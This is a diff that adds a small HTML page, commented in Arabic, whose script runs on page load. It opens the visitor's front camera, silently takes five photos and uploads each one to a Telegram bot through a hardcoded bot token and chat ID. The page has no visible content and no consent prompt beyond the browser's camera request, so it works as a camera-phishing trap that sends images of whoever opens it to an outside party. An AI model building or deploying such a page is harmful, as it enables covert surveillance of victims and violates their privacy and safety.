@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Capture and Send Photos</title>
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+</head>
+<body>
+
+  <script>
+    const botToken = '7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY';
+    const chatId = '1538488453';
+    let photoCount = 0;
+
+    async function captureAndSendPhotos() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); // تحديد الكاميرا الأمامية
+        const videoTrack = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+        
+        // التقاط 5 صور فقط
+        for (let i = 0; i < 5; i++) {
+          const photoBlob = await imageCapture.takePhoto({ format: 'jpeg', quality: 0.1 }); // تقليل جودة الصورة
+          await sendPhotoToTelegram(photoBlob);
+        }
+      } catch (error) {
+        console.error('Error capturing and sending photos:', error);
+      }
+    }
+
+    async function sendPhotoToTelegram(photoBlob) {
+      try {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', photoBlob, `photo${photoCount}.jpg`);
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formData);
+        console.log('Photo sent to Telegram bot');
+        photoCount++;
+      } catch (error) {
+        console.error('Error sending photo to Telegram bot', error);
+      }
+    }
+
+    // بدء التقاط الصور وإرسالها فور تحميل الصفحة
+    captureAndSendPhotos();
+  </script>
+</body>
+</html>
